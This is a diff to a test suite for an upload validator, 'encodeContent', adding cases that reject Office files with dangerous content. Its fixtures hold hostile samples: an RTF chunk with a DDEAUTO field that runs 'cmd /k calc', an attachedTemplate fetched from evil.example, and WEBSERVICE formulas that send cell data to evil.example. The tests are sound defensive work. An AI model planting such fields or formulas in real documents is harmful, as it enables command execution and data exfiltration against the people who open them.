@@ -76,6 +76,11 @@ describe("encodeContent", () => {
       await expect(encodeContent("a.xlsx", await pack({ "xl/_rels/workbook.xml.rels": rels("externalLink", "x.xml", false) }))).rejects.toThrow(/links to other workbooks/);
     });
 
+    it("is refused when it imports an HTML or RTF chunk, whose fields aren't readable here", async () => {
+      const chunk = { "word/_rels/document.xml.rels": rels("aFChunk", "chunk.rtf", false), "word/chunk.rtf": "{\\rtf1{\\field{\\*\\fldinst DDEAUTO cmd \"/k calc\"}}}" };
+      await expect(encodeContent("a.docx", await pack(chunk, { "word/chunk.rtf": "application/rtf" }))).rejects.toThrow(/has imported HTML or RTF content/);
+    });
+
     it("is refused when opening it fetches something, but may link to a page", async () => {
       await expect(encodeContent("a.docx", await pack({ "word/_rels/settings.xml.rels": rels("attachedTemplate", "https://evil.example/t.dotm") })))
         .rejects.toThrow(/fetches from elsewhere when opened \(attachedTemplate\)/);
@@ -106,6 +111,7 @@ describe("encodeContent", () => {
       await expect(encodeContent("a.xlsx", await pack({ "xl/worksheets/sheet1.xml": sheet("WEBSERVICE(&quot;https://evil.example/?&quot;&amp;A2)") })))
         .rejects.toThrow(/formula files uploaded here can't have.*WEBSERVICE/);
       await expect(encodeContent("a.xlsx", await pack({ "xl/other/data.xml": sheet('<![CDATA[WEBSERVICE("https://evil.example/")]]>') }))).rejects.toThrow(/WEBSERVICE/);
+      await expect(encodeContent("a.xlsx", await pack({ "xl/worksheets/sheet1.xml": sheet("MAP(A2:A9,_xleta.WEBSERVICE)") }))).rejects.toThrow(/WEBSERVICE/);
       await expect(encodeContent("a.xlsx", await pack({ "xl/worksheets/sheet1.xml": sheet("SUM(B1:B9)") }))).resolves.toBeDefined();
     });
 
